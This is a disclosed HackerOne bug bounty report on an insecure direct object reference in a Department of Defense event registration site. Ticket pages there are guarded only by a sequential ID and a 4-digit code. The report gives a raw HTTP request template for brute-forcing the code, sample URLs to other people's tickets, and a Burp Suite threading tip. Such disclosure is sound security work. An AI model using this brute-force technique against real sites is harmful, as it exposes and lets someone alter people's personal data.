# [█████] Get all tickets (IDOR)

## Report Details
- **Report ID**: 498351
- **URL**: https://hackerone.com/reports/498351
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-02-19T23:49:48.991Z
- **Disclosed**: 2019-12-02T19:12:18.591Z

## Reporter
- **Username**: jarvis0x1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
In this report I want to describe an interesting vulnerability that allows you to extract tickets with personal data on the site. When user registering a new entry, the user receives a link with a ticket number and a random 4-digit code. The vulnerability is that this code can be easily bruted, so the entire database can be iterated.

### Steps to reproduce

1) Go to page https://█████/daumw2017/Registration.aspx and register
2) After registering you will be redirect to page look like this https://██████/daumw2017/ThankYou.aspx?PID=12004&RNo=4387

PID - number of ticket
RNo - random number (4 digits)

So I can decrement PID and brute RNo, and when I guess Rno for current PID, I will get info about ticket.

3) Use this request for brute
```
GET /daumw2017/ThankYou.aspx?PID=<ID_record>&RNo=<4_digit_random_number> HTTP/1.1
Host: ██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: ASP.NET_SessionId=40n0abdtjikowu5qzr4e2fyj
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

```

Result (not my tickets):

https://███████/daumw2017/ThankYou.aspx?PID=12000&RNo=7380
█████

https://███/daumw2017/ThankYou.aspx?PID=11999&RNo=9841
██████

https://█████████/daumw2017/ThankYou.aspx?PID=11998&RNo=1038
█████████

https://██████/daumw2017/ThankYou.aspx?PID=11997&RNo=8846
███████


If you get access to ticket, you can easy change content of it!

__Optimal number of threads is 20-30 in Burp Suite__

## Impact

Hacker can get access to all tickets on the site, which contain emails, first names, last names and other confidential information. Also, a hacker has the ability to change data of this tickets.

## Attachments
No attachments
